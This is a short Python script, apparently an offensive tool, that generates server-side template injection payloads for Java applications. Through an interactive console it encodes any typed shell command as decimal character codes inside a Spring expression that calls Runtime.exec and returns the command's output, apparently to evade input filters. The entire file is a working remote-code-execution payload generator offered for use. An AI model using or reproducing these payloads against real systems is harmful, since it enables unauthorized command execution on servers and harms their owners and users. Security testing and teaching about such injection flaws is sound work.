#!/usr/bin/python3

from cmd import Cmd
import optparse as parse

#############################################################################################
#         SIMPLE TOOL TO GENERATE SSTI PAYLOAD FOR JAVA APPLICATIONS                        #
#############################################################################################

 
def Get_Values():
    # CLI
    parser = parse.OptionParser()
    parser.add_option("-s", "--symbol", dest="symbol", help="Symbol to add before payload")
    (values, arguments) = parser.parse_args()
    
    if not values.symbol:
        parser.error("[X] Please specify symbol, use --help for more info [X]")
              
    return values


values = Get_Values()

class Console(Cmd):
    
	consolePrompt='\033[1;33mCommand ==>\033[0m '
 
	def decimal_encode(self,args):
		command=args

		decimals=[]

		for i in command:
			decimals.append(str(ord(i)))

		payload= values.symbol + '''{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
		

		for i in decimals[1:]:
			line='.concat(T(java.lang.Character).toString({}))'.format(i)
			payload+=line

		payload+=').getInputStream())}'
  
		return payload

	def default(self,args):
		print(self.decimal_encode(args))
		print()
try:
	term=Console()
	term.cmdloop()
except KeyboardInterrupt:
	quit()
